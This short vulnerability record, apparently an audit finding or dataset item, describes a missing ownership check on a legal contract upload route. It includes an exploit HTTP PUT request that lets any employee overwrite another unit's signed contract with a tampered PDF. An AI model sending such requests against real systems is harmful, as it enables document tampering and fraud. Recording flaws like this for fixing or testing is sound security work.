diagnosis: The legal contract upload route replaces the signed PDF copy for contractId. Although checkLegalAuth verifies authentication, it does not confirm whether req.user is a signatory or legal counsel for the specific contractId. Any authenticated employee can upload a tampered contract agreement to overwrite legal contracts of other business units.
exploit_request:
PUT /contracts/ctr_merger_acquisition_2026/signed-copy HTTP/1.1
Host: legal.corporation.com
Authorization: Bearer <employee_jwt>
Content-Type: multipart/form-data; boundary=---------------------------974767299

-----------------------------974767299

%PDF-1.4...
